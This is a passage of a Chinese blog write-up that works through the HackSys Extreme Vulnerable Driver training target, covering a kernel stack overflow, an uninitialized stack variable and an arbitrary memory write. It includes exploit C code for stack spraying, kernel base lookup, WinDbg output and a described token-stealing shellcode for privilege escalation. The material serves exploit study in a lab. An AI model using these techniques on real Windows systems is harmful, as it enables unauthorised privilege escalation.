src="http://hacky.wang/blog/20220720/88pOuaHsceok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;含有漏洞代码主要位于<code>HackSysExtremeVulnerableDriver</code>中的<code>IrpDeviceIoCtlHandler</code>函数中，这个函数包含了HEVD所有的漏洞类型。<br>    <img src="http://hacky.wang/blog/20220720/ABYOW7EY0EiO.png?imageslim" alt="mark"></p><h2 id="0x2-2-成因分析"><a href="#0x2-2-成因分析" class="headerlink" title="0x2.2 成因分析"></a>0x2.2 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈溢出位于HEVD控制码为0x222003的函数处，也就是<code>sub_44517E</code>,很显然，在<code>sub_44517E</code>函数中，将有R3传入的缓冲区，以及该缓冲区的大小传入函数<code>sub_4451A2</code>,在<code>sub_4451A2</code>函数中，并没有对传入的缓冲区大小进行校验，即判断两个缓冲区大小。导致我们传入大于KernelBuffer的大小的UserBuffer，导致栈溢出。<br>    <img src="http://hacky.wang/blog/20220720/4nSgKhHGpCmm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/LSCnVV4FxHK7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据IDA的解析结果来看，var_1c占了1C大小的空间，KernelBuffer占据了1C-81C共计800h大小的空间，这样子一共占用了81Ch大小的空间，加上返回地址4h的空间，一共占了820h的空间，所以我们构造栈溢出的话，只需要构造820h+4h的空间即可。<br>    <img src="http://hacky.wang/blog/20220720/LeGxgvP8T0ok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，存在漏洞的版本，直接按照UserBuffer大小将UserBuffer复制给KernelBuffer，而修复之后的版本，是按照KernelBuffer大小将UserBuffer复制给KernelBuffer，由此修复了漏洞。<br>    <img src="http://hacky.wang/blog/20220720/ABM8Dt0a3dkC.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>HEVD！TriggerBufferOverflowStack</code>处下断，以及在Buffer复制的地方下断，首先断在<code>HEVD！TriggerBufferOverflowStack</code>开头，查看栈顶寄存器为0x98075bd4，当运行到memcpy处，查看目的地址，也就是第一个参数地址为0x980753b4，两者相减，大小为0x00000820。也就是说，只需要构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/oFYFtM7SlLfQ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/3CHfIoNcpwCb.png?imageslim" alt="mark"></p><h2 id="0x2-3-漏洞利用"><a href="#0x2-3-漏洞利用" class="headerlink" title="0x2.3 漏洞利用"></a>0x2.3 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，需要打开驱动设备，在没有源码的情况下，在<code>DriverEntry</code>函数中，创建了一个名为<code>\\Device\\HackSysExtremeVulnerableDriver</code>的Device，所以在R3也应该创建<code>\\\\.\\HackSysExtremeVulnerableDriver</code>的Device。<br>    <img src="http://hacky.wang/blog/20220720/m7vPrx9mIecR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，如上所说，应该构造符合条件的Shellcode。具体就是构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/OjgBcmXNrzLB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后将payload通过<code>DeviceIoControl</code>传入，Shellcode的原理是通过FS+0x124，获取线程的KTHREAD,然后在通过KTHREAD+0x50获取进程的EPROCESS，然后将当前进程的EPROCESS地址保存在ECX寄存器中。因为EPROCESS是一个链装结构，通过<code>mov eax, [eax + FLINK_OFFSET]</code>这个语句可以定位到下一个EPROCESS链，然后减去0xB8即可定位到EPROCESS结构头。在EPROCESS偏移+0xB4处获取PID，然后和system进程的PID(4)相比，以确定system进程。然后通过0xF8获取system进程token，并将system进程token保存。然后调整栈就可以了。<br>    <img src="http://hacky.wang/blog/20220720/PIoN4NqXKGQ9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/qjPxVHC365cM.png?imageslim" alt="mark"></p><h2 id="0x2-4-参考"><a href="#0x2-4-参考" class="headerlink" title="0x2.4 参考"></a>0x2.4 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270172.htm" target="_blank" rel="external">HEVD学习笔记之缓冲区溢出攻击</a></li><li><a href="https://bbs.pediy.com/thread-252484.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(2)-内核栈溢出</a></li></ul><h1 id="0x3-未初始化栈变量"><a href="#0x3-未初始化栈变量" class="headerlink" title="0x3 未初始化栈变量"></a>0x3 未初始化栈变量</h1><h2 id="0x3-1-成因分析"><a href="#0x3-1-成因分析" class="headerlink" title="0x3.1 成因分析"></a>0x3.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;变量创建之后，如果没有及时进行初始化赋值操作，当再次使用该变量的时候，容易产生出乎意料的运行结果。所以我们在编码过程中，一定不要忘记对变量进行初始化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下代码,函数指针及时进行了初始化赋值<code>pFunc = test;</code>,在后续调用该指针指向的函数时<code>(*pFunc)();</code>，产生了正确的结果<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"test\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">void</span> (*pFunc)();</div><div class="line">    pFunc = test;</div><div class="line">    (*pFunc)();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在例如函数指针没有进行初始化,此时pFunc为随机值，调用他将会产生出乎意料的结果。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"test\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">void</span> (*pFunc)();</div><div class="line">    (*pFunc)();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定位到<code>TriggerUninitializedMemoryStack</code>函数，在第五行，声明了函数指针v4，当传入的UserBuffer为特定的0xBAD0B0B0时，为v4赋值。然后对v4判空之后，调用v4，该漏洞存在于，如果传入的并不是0xBAD0B0B0，则不会对v4进行赋值，而v4也没有初始化，则导致程序出现出乎意料的结果，由此未初始化栈变量漏洞产生。<br>    <img src="http://hacky.wang/blog/20220727/QXweqQTxxSgm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看一下是如何修复的，初始化UninitializedMemory变量即可。<br>    <img src="http://hacky.wang/blog/20220727/Uu7tqsy4O0e1.png?imageslim" alt="mark"></p><h2 id="0x3-2-漏洞利用"><a href="#0x3-2-漏洞利用" class="headerlink" title="0x3.2 漏洞利用"></a>0x3.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞是由于未初始化变量产生的，也就是变量的值是一个随机值，并不是一个默认值(NULL),所以构造零页内存是不可以的。这里用到的漏洞利用技术是栈喷射。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当传入的Buffer不为0xBAD0B0B0时，不会对v4进行赋值，此时默认的v4的值为NULL。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> UninitializedMemoryStack()</div><div class="line">&#123;</div><div class="line"><span class="comment">//Step1 打开设备</span></div><div class="line">HANDLE hDevice = <span class="literal">NULL</span>;</div><div class="line">LPCSTR FileName = (LPCSTR)LINK_NAME;</div><div class="line">hDevice = GetDeviceHandle(FileName);</div><div class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hDevice)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]  GetDeviceHandle:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//栈喷射</span></div><div class="line"><span class="comment">//ULONG ShellCodeAddr = (ULONG)ShellCode;</span></div><div class="line"><span class="comment">//if (StackPengShe(ShellCodeAddr) == FALSE)</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//printf("[!] StackPengShe Error\n");</span></div><div class="line"><span class="comment">//return FALSE;</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//Step3 触发漏洞</span></div><div class="line">CHAR  UserBuffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">memset(UserBuffer, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(UserBuffer));</div><div class="line">ULONG uReturnlength = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (DeviceIoControl(hDevice,</div><div class="line">HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,</div><div class="line">&amp;UserBuffer,</div><div class="line"><span class="keyword">sizeof</span>(UserBuffer),</div><div class="line"><span class="literal">NULL</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;uReturnlength,</div><div class="line"><span class="literal">NULL</span>) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] DeviceIoControl :%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">kd&gt; <span class="built_in">bp</span> 9951d097</div><div class="line">kd&gt; g</div><div class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</div><div class="line">HEVD!TriggerUninitializedMemoryStack+<span class="number">0x9d</span>:</div><div class="line">9951d097 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">kd&gt; r <span class="built_in">eax</span></div><div class="line"><span class="built_in">eax</span>=<span class="number">00000000</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在查看一下kernel栈，如下。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">kd&gt; dps esp</div><div class="line"><span class="number">94237</span>ab4  <span class="number">387</span>f514e</div><div class="line"><span class="number">94237</span>ab8  <span class="number">85</span>f99398</div><div class="line"><span class="number">94237</span>abc  <span class="number">83</span>f0b675 nt!DbgPrintEx</div><div class="line"><span class="number">94237</span>ac0  <span class="number">85</span>f99408</div><div class="line"><span class="number">94237</span>ac4  <span class="number">83</span>eb2361 nt!KeUpdateRunTime+<span class="number">0x164</span></div><div class="line"><span class="number">94237</span>ac8  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>acc  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>ad0  <span class="number">00008</span>eb0</div><div class="line"><span class="number">94237</span>ad4  <span class="number">66</span>b499f8</div><div class="line"><span class="number">94237</span>ad8  <span class="number">000067</span>f6</div><div class="line"><span class="number">94237</span>adc  <span class="number">00006700</span></div><div class="line"><span class="number">94237</span>ae0  <span class="number">94237</span>b60</div><div class="line"><span class="number">94237</span>ae4  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>ae8  <span class="number">8713</span>fc60</div><div class="line"><span class="number">94237</span>aec  <span class="number">87</span>d5e460</div><div class="line"><span class="number">94237</span>af0  <span class="number">83</span>f70c00 nt!KiInitialPCR</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当启用栈喷射，内核堆栈效果如下。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">kd&gt; dps esp</div><div class="line"><span class="number">8</span>f3daab4  <span class="number">2361814</span>e</div><div class="line"><span class="number">8</span>f3daab8  <span class="number">881925</span>a8</div><div class="line"><span class="number">8</span>f3daabc  <span class="number">83</span>f0b675 nt!DbgPrintEx</div><div class="line"><span class="number">8</span>f3daac0  <span class="number">88192618</span></div><div class="line"><span class="number">8</span>f3daac4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daac8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daacc  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daadc  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaec  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daafc  <span class="number">00941170</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈喷射实现是利用NtMapUserPhysicalPages，设置我们构造好的数据，从而填充内核堆栈。NtMapUserPhysicalPages接收的长度为1024，填充的ShellcodeAddr大小为4，所以需要开辟1024 * 4的空间。这都算是定式，记住即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//栈喷射</span></div><div class="line"><span class="function">BOOL  <span class="title">StackPengShe</span><span class="params">(ULONG ShellcodeAddr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line"><span class="comment">//NtMapUserPhysicalPages</span></div><div class="line">pfnNtMapUserPhysicalPages NtMapUserPhysicalPages = (pfnNtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtMapUserPhysicalPages"</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == NtMapUserPhysicalPages)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] Get Address NtMapUserPhysicalPages Error\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//NtMapUserPhysicalPages 接受的最大长度为1024</span></div><div class="line">PDWORD StackSpray = (PDWORD)<span class="built_in">malloc</span>(<span class="number">1024</span> * <span class="number">4</span>);</div><div class="line"><span class="built_in">memset</span>(StackSpray, <span class="string">'A'</span>, <span class="number">1024</span> * <span class="number">4</span>);</div><div class="line"><span class="comment">//填充ShellcodeAddr</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</div><div class="line">&#123;</div><div class="line"><span class="comment">//*(PDWORD)((DWORD)StackSpray + i) = (DWORD)&amp;ShellcodeAddr;</span></div><div class="line">StackSpray[i] = ShellcodeAddr;</div><div class="line">&#125;</div><div class="line"><span class="comment">//R3影响R0</span></div><div class="line">ntStatus = NtMapUserPhysicalPages(<span class="literal">NULL</span>, <span class="number">1024</span>, StackSpray);</div><div class="line"><span class="comment">//return ntStatus == 0 ? TRUE : FALSE;</span></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x4-任意地址覆盖"><a href="#0x4-任意地址覆盖" class="headerlink" title="0x4 任意地址覆盖"></a>0x4 任意地址覆盖</h1><h2 id="0x4-1-成因分析"><a href="#0x4-1-成因分析" class="headerlink" title="0x4.1 成因分析"></a>0x4.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任意地址覆盖，指的是代码没有验证地址是否有效直接使用。通过构造payload，将用来提权的Shellcode的地址覆盖到可以导致内核代码执行的区域从而实现提权。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞位于HEVD控制码为0x22200B的函数<code>sub_444BCE</code>处,在<code>sub_444BCE</code>函数中，将R3传来的缓冲区传入了<code>sub_444BEE</code>,乍一看，很难发现这段代码有什么问题，就是单纯的将What成员复制给了Where成员，但是在内核中，没有针对地址的有效性进行验证，直接使用的话，这是非常危险的。<br>    <img src="http://hacky.wang/blog/20220720/gglXAaml6Ltv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，漏洞版本就是没有对地址进行检查，而修复的版本，可以看到对需要读取的地址，使用ProbeForRead和ProbeForWrite进行了检查，ProbeForRead和ProbeForWrite的作用就是检查用户模式缓冲区是否位于用户态，并验证对齐。<br>    <img src="http://hacky.wang/blog/20220720/EmKALOaM0m6g.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在学习这个漏洞的时候，我一直想不明白，就光一个内存写入怎么就触发漏洞了，后来其实才明白原理，其实内存写入这个动作并不会触发漏洞，关键是写入的这个地址(也就是代码里面的What)才是危险的，我们可以这样构造，首先What这个地方存储的是ShellCode的地址，然后在找一个地方，只要可以执行就好了，因为通过这个任意地址覆盖，将Shellcode的地址覆盖到那个可以执行的地址上，那么通过触发，就可以执行Shellcode了。而<code>HalDispatchTable+0x4</code>就是这样一个地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何定位<code>HalDispatchTable+0x4</code>，首先查看一下<code>nt!NtQueryIntervalProfile</code>这个函数的反汇编，在<code>nt!NtQueryIntervalProfile+0x6B</code>调用了<code>nt!KeQueryIntervalProfile</code>,跟进<code>nt!KeQueryIntervalProfile</code>,显然在在<code>0x8410e8b4</code>调用了<code>nt!HalDispatchTable+0x4</code>这个分发表，<strong>只需要记住，shellcode往这个地方写就是了，貌似高版本的系统这个地方已经被缓解了。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">kd&gt; u nt!NtQueryIntervalProfile+<span class="number">0x6B</span></div><div class="line">nt!NtQueryIntervalProfile+<span class="number">0x6b</span>:</div><div class="line">8414ffa6 e8e6e8fbff      <span class="keyword">call</span>    nt!KeQueryIntervalProfile (8410e891)</div><div class="line">8414ffab 84<span class="built_in">db</span>            <span class="keyword">test</span>    <span class="built_in">bl</span>,<span class="built_in">bl</span></div><div class="line">8414ffad 741b            <span class="keyword">je</span>      nt!NtQueryIntervalProfile+<span class="number">0x8f</span> (8414ffca)</div><div class="line">8414ffaf c745fc01000000  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">1</span></div><div class="line">8414ffb6 <span class="number">8906</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="built_in">eax</span></div><div class="line">8414ffb8 eb07            <span class="keyword">jmp</span>     nt!NtQueryIntervalProfile+<span class="number">0x86</span> (8414ffc1)</div><div class="line">8414ffba 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8414ffbc <span class="number">40</span>              <span class="keyword">inc</span>     <span class="built_in">eax</span></div><div class="line">//======&gt;nt!KeQueryIntervalProfile</div><div class="line">kd&gt; U nt!KeQueryIntervalProfile l20</div><div class="line">nt!KeQueryIntervalProfile:</div><div class="line">8410e891 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">8410e893 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">8410e894 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">8410e896 83ec10          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">10h</span></div><div class="line">8410e899 83f801          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line">8410e89c <span class="number">7507</span>            <span class="keyword">jne</span>     nt!KeQueryIntervalProfile+<span class="number">0x14</span> (8410e8a5)</div><div class="line">8410e89e a1889afa83      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!KiProfileAlignmentFixupInterval (83fa9a88)]</div><div class="line">8410e8a3 c9              <span class="keyword">leave</span></div><div class="line">8410e8a4 c3              <span class="keyword">ret</span></div><div class="line">8410e8a5 8945f0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span></div><div class="line">8410e8a8 8d45fc          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">4</span>]</div><div class="line">8410e8ab <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8ac 8d45f0          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]</div><div class="line">8410e8af <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8b0 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span></div><div class="line">8410e8b2 6a01            <span class="keyword">push</span>    <span class="number">1</span></div><div class="line">8410e8b4 ff15bcf3f683    <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!HalDispatchTable+<span class="number">0x4</span> (83f6f3bc)]</div><div class="line">8410e8ba 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8410e8bc 7c0b            <span class="keyword">jl</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8be 807df400        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="number">0</span></div><div class="line">8410e8c2 <span class="number">7405</span>            <span class="keyword">je</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8c4 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]</div><div class="line">8410e8c7 c9              <span class="keyword">leave</span></div><div class="line">8410e8c8 c3              <span class="keyword">ret</span></div></pre></td></tr></table></figure></p><h2 id="0x4-2-漏洞利用"><a href="#0x4-2-漏洞利用" class="headerlink" title="0x4.2 漏洞利用"></a>0x4.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先第一步打开设备，第二歩就是获取HalDispatchTable+4地址，这个地址用来存放ShellCode。获取<code>获取HalDispatchTable+4</code>地址主要有四步，因为<code>HalDispatchTable</code>这个地址在R3是导出的，只需要获取<code>ntkrnlpa.exe</code>在R3的基地址和R0的基地址，<code>HalDispatchTable</code>在R3的地址，减去<code>ntkrnlpa.exe</code>在R3的基地址，加上R0的基地址就是<code>HalDispatchTable</code>在R0的地址。所以获取<code>HalDispatchTable</code>在R0地址只需要四步。</p><ul><li>获取<code>ntkrnlpa.exe</code>在R0基地址</li><li>通过<code>LoadLibrary</code>获取<code>ntkrnlpa.exe</code>在R3基地址</li><li>通过<code>GetProcAddress</code>获取<code>HalDispatchTable</code>在R3的地址</li><li>计算<code>HalDispatchTable</code>在R0的的地址<br>  <img src="http://hacky.wang/blog/20220720/TCkVreVYvKrV.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中如何获取<code>ntkrnlpa.exe</code>在R0的基地址呢。首先<code>EnumDeviceDrivers</code>获取所有的驱动模块基地址，然后根据基地址，调用<code>GetDeviceDriverBaseNameA</code>获取驱动名，依次比较是否是<code>ntkrnlpa.exe</code>即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function">PVOID <span class="title">GetBaseAddrOfntkrnlpaInKernel</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//遍历所有的驱动程序基地址</span></div><div class="line">LPVOID lpImageBase[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">DWORD lpcbNeeded = <span class="number">0</span>;</div><div class="line">TCHAR lpfileName[<span 